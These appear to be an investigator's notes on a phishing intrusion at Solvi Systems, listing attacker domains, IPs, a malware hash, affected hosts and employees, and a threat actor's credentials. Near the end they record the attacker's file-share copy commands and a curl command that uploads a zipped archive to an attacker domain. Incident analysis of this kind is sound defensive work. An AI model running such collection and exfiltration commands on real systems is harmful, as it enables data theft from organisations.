## Possibly affected countries: 
    
    - South Africa
    - Mozambique 
    - Eswatini
    - Zimbabwe
    - Namibia

## Recon:
    
    Product: docks-ics
    Alert:
        Type: xss
        Response: 404
        User-Agent: Opera/8.64
        Time: 2024-05-03T14:48:08Z
        Total Requests: 9
        Total Success: 0
    
    Suspicious Email:
        Subject:
            [EXTERNAL] Business Opportunity: Two major energy companies merging
        From:
            Email: news@eco-awareness-updates.net
            Name: unknown
        To:
            Email: carla_wharton@solvisystems.com
            Name: Carla Wharton
        Link:
            http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx
    
    Source IPs:
        - 105.78.23.64
        - 13.201.46.208
        - 56.6.30.190
        - 98.117.26.236

    Domains: 3
        1. energy-trends4u.net
        2. news-on-industry.com
        3. eco-awareness-update.net
            Details:
                - Sent multiple emails
                - Links sent: 56
                - Emails used:
                    * electric_updates@gmail.com
                    * energy_industry_news@protonmail.com
                    * news@eco-awareness-updates.net

    Documents Taken:
        - Energy_Industry_Trends_2024_4_Solvi.docx
        - Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
        - Eco_Awareness_Update_2024.docx
        - Docks_ICS_User_Guide.pdf

    Timeline:
        Total Records: 64
        First Request: 2024-05-01T00:00:00Z
        First Email:
            Time: 2024-05-01T15:51:41Z
            Recipient: Carla Wharton
            Email: carla_wharton@solvisystems.com

    Possible infected IPS:
        - 10.10.0.191
        - 10.10.0.164
            file downloaded: ecobug.exe
            file hash: 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252
            times downloaded: 39
            ip contacted: 98.117.26.236:1337
                times contacted: 24
                per 24H: 1
                  time: 17:38:25
                total infect time: 24 days
        - 10.10.0.81
        - 10.10.0.220
        - 10.10.0.234
        - 10.10.1.70
    Total connections: 470
    Total distict machines: 38

## Employees: 500

    Alexis Khoza:
        Role: CTO
        IP: 10.10.0.7
        Email: alexis_khoza@solvisystems.com
        Company Domain: solvisystems.com
        Username: alkhoza
        Hostname: 7FVW-LAPTOP

    Carla Wharton
        Role: Sales Representative
        IP: 10.10.0.164
        Email: carla_wharton@solvisystems.com
        Company Domain: solvisystems.com
        Username: cawharton
        Hostname: JUSP-LAPTOP


    Alexei Petrov
        role: Docks Customer Success Manager
        IP: 10.10.0.3
        Email: alexei_petrov@solvisystems.com
        Company Domain: solvisystems.com
        Username: alpetrov
        Hostname: SJ9V-MACHINE 

## Roles:
            CTO:                                    Alexis Khoza
            Customer Support Specialist:            27            
            Sales Representative:                   17                  
            Project Manager for Docks ICS:          Jamie Lee        
            Docks Customer Success Manager:         Alexei Petrov       
            DOCKS ICS Security Lead:                Taylor Green              

## Threat actor:
    username: gu@rd!an
    password: abc1toothree
    Admin group: yes
    multiple infections:
        JUSP-LAPTOP
        BHMF-LAPTOP
        MQQY-MACHINE
        BEFQ-DESKTOP
        1WA7-DESKTOP
    Discovery commands:
        - net use
        - net use /PERSISTENT:YES
                - SJ9V-MACHINE : 2024-05-27T16:23:10Z
                
                    - Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\*       
                          -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
                
                - UPLM-DESKTOP : 2024-05-28T16:43:31Z
                    
                    -Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* 
                         -Destination   C:\\Users\\jalee\\CollectedData\\Software_Cycle_Docs


                - JP4D-MACHINE : 2024-05-29T12:23:25Z
                  
            
Exfil Dara destination:
    - C:\DataExfil\CollectedData.zip
       file name: CollectedData.zip
    Exfil command:
        - curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
    Accounts used:
        - tagreen
        - alpetrov
        - jalee

Internal sites visited:
    - devportal.solvisystems.com
Email subject for sdlc:
    - Urgent Request: DOCKS System Documentation 🚨